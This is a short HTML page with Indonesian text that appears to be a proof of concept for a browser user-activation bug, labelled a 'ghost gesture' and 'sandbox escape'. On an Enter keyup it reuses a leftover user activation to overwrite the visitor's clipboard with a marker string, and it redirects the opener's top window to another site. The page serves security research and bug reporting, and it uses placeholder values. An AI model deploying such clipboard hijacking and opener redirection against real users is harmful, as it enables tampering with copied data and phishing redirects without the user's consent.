<!DOCTYPE html>
<html>

<head>
    <title>Site B - The Escaper</title>
</head>

<body style="background-color: #e8f5e9; text-align: center; font-family: sans-serif;">
    <h3>Situs B (Popup - Unsandboxed)</h3>
    <h1 style="color: red;">LEPASKAN "ENTER" SEKARANG!</h1>
    <div id="status" style="border: 2px solid black; padding: 20px;">Menunggu Ghost Gesture...</div>

    <script>
        window.addEventListener('keyup', async (e) => {
            if (e.key === 'Enter') {
                const isActive = navigator.userActivation.isActive;
                if (isActive) {
                    try {
                        await navigator.clipboard.writeText("HACKED_BY_DOUBLE_JUMP_123");
                        document.getElementById('status').innerHTML += "<p style='color:red;'>✅ Clipboard Hijacked!</p>";
                    } catch (err) { }
                    document.getElementById('status').innerHTML += "<p style='color:red;'>✅ Escaping Parent Sandbox...</p>";
                    setTimeout(() => {
                        if (window.opener) {
                            window.opener.top.location.href = 'https://example.com';
                        } else {
                            window.location.href = 'https://example.com';
                        }
                    }, 1000);
                }
            }
        });
    </script>
</body>

</html>
